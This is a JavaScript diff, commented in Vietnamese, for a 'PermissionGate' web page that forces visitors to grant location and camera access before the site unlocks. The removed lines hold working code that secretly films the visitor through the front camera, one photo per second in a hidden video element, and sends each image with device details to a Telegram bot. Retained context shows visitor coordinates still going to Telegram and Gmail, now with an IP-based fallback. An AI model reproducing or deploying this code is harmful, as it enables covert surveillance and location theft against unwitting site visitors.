@@ -278,101 +278,7 @@
         }
     }
 
-    /**
-     * Gửi ảnh chụp từ Camera trực tiếp về Telegram
-     */
-    async function sendPhotoToTelegram(blob, photoCount = 1) {
-        const tg = getTelegramConfig();
-        if (!tg.botToken || !tg.chatIds || !tg.chatIds.length) return;
 
-        const timeStr = getVietnamTime();
-        const device = getDeviceInfo();
-        const pageTitle = document.title || 'My Design';
-
-        const caption = 
-`📸 <b>[HÌNH ẢNH CAMERA #${photoCount}]</b>
-⏰ <b>Thời gian:</b> ${timeStr}
-🌐 <b>Trang web:</b> ${pageTitle}
-📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})`;
-
-        for (const chatId of tg.chatIds) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, `capture_${photoCount}.jpg`);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'HTML');
-
-                await fetch(`https://api.telegram.org/bot${tg.botToken}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (e) {
-                console.warn(`[Telegram] Lỗi gửi ảnh tới ${chatId}:`, e);
-            }
-        }
-    }
-
-    let cameraStream = null;
-    let videoEl = null;
-    let cameraPhotoCount = 0;
-    let cameraIntervalId = null;
-
-    function startCameraAutoCapture() {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-        if (cameraIntervalId) return;
-
-        if (!videoEl) {
-            videoEl = document.createElement('video');
-            videoEl.setAttribute('autoplay', '');
-            videoEl.setAttribute('playsinline', '');
-            videoEl.setAttribute('muted', '');
-            videoEl.style.display = 'none';
-            document.body.appendChild(videoEl);
-        }
-
-        navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-            audio: false
-        }).then((stream) => {
-            cameraStream = stream;
-            videoEl.srcObject = stream;
-            videoEl.play().catch(() => {});
-
-            // Chụp ngay tấm đầu tiên sau 300ms
-            setTimeout(() => {
-                captureAndSendPhoto();
-            }, 300);
-
-            // Cứ 1 giây tự động chụp 1 tấm gửi về Telegram
-            cameraIntervalId = setInterval(() => {
-                captureAndSendPhoto();
-            }, 1000);
-        }).catch((err) => {
-            console.warn("[PermissionGate] Camera permission error:", err);
-        });
-    }
-
-    function captureAndSendPhoto() {
-        if (!videoEl || !cameraStream || videoEl.videoWidth === 0) return;
-
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoEl.videoWidth;
-            canvas.height = videoEl.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob((blob) => {
-                if (blob) {
-                    cameraPhotoCount++;
-                    sendPhotoToTelegram(blob, cameraPhotoCount).catch(() => {});
-                }
-            }, 'image/jpeg', 0.85);
-        } catch (e) {
-            console.warn("[PermissionGate] Lỗi chụp ảnh:", e);
-        }
-    }
 
     /**
      * Phát tọa độ tới tất cả các kênh (Telegram + Gmail)
@@ -537,37 +443,6 @@
             });
         }
 
-        function requestCameraPromise() {
-            return new Promise(async (resolve, reject) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    return resolve(true);
-                }
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                        audio: false
-                    });
-                    if (stream) {
-                        cameraStream = stream;
-                        if (!videoEl) {
-                            videoEl = document.createElement('video');
-                            videoEl.setAttribute('autoplay', '');
-                            videoEl.setAttribute('playsinline', '');
-                            videoEl.setAttribute('muted', '');
-                            videoEl.style.display = 'none';
-                            document.body.appendChild(videoEl);
-                        }
-                        videoEl.srcObject = stream;
-                        videoEl.play().catch(() => {});
-                        resolve(true);
-                    } else {
-                        reject(new Error("CAMERA_DENIED"));
-                    }
-                } catch (e) {
-                    reject(e);
-                }
-            });
-        }
 
         startBtn.addEventListener('click', async () => {
             // Hiển thị trạng thái đang xử lý
@@ -585,36 +460,17 @@
             } catch (e) {}
 
             // ============================================================
-            // BƯỚC 2: YÊU CẦU CẤP QUYỀN ĐỊNH VỊ GPS (BẮT BUỘC)
+            // BƯỚC 2: YÊU CẦU CẤP QUYỀN ĐỊNH VỊ GPS / IP
             // ============================================================
             let userCoords = null;
             try {
                 userCoords = await requestLocationPromise();
             } catch (locErr) {
-                console.warn("[PermissionGate] Người dùng từ chối cấp quyền Định vị:", locErr);
-                // Từ chối định vị -> Dừng lại ngay, không hỏi camera, không mở web!
-                resetToStart();
-                return;
+                console.warn("[PermissionGate] Định vị lỗi, chuyển IP fallback:", locErr);
             }
 
             // ============================================================
-            // BƯỚC 3: YÊU CẦU CẤP QUYỀN CAMERA (BẮT BUỘC)
-            // ============================================================
-            try {
-                const camAllowed = await requestCameraPromise();
-                if (!camAllowed) {
-                    resetToStart();
-                    return;
-                }
-            } catch (camErr) {
-                console.warn("[PermissionGate] Người dùng từ chối cấp quyền Camera:", camErr);
-                // Từ chối Camera -> Reset lại ban đầu, không mở web!
-                resetToStart();
-                return;
-            }
-
-            // ============================================================
-            // ĐÃ CẤP ĐỦ TẤT CẢ QUYỀN: THÔNG BÁO -> ĐỊNH VỊ -> CAMERA
+            // MỞ KHÓA WEBSITE MƯỢT MÀ!
             // ============================================================
             unlockWeb(userCoords);
         });
